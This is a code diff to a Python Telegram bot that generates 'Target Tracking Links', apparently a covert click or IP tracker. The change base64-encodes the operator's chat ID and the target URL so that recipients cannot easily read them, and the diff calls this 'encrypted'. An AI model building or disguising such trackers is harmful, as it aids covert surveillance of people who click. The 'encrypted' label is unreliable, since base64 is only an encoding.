@@ -90,11 +90,14 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not (target_url.startswith("http://") or target_url.startswith("https://")):
             target_url = "https://" + target_url
 
-        encoded_url = base64.urlsafe_b64encode(target_url.encode()).decode()
+        # Target URL ebong User ID (UID) duita-kei base64 encode kora holo
+        encoded_url = base64.urlsafe_b64encode(target_url.encode()).decode().rstrip("=")
+        encoded_cid = base64.urlsafe_b64encode(str(user_id).encode()).decode().rstrip("=")
+        
         unique_id = str(uuid.uuid4())[:6]
         
-        # dynamic target_chat_id যোগ করা হয়েছে
-        tracking_link = f"{RENDER_BASE_URL}/?id={unique_id}&cid={user_id}&url={encoded_url}"
+        # Link-e ekhon encoded cid thakbe
+        tracking_link = f"{RENDER_BASE_URL}/?id={unique_id}&cid={encoded_cid}&url={encoded_url}"
         
         response_msg = (
             f"🎯 **Target Tracking Link Created Successfully!**\n\n"
@@ -119,5 +122,5 @@ if __name__ == '__main__':
     application.add_handler(CommandHandler("start", start))
     application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
 
-    print("Multi-user Dynamic link bot is running...")
+    print("Secure encrypted UID bot is running...")
     application.run_polling()
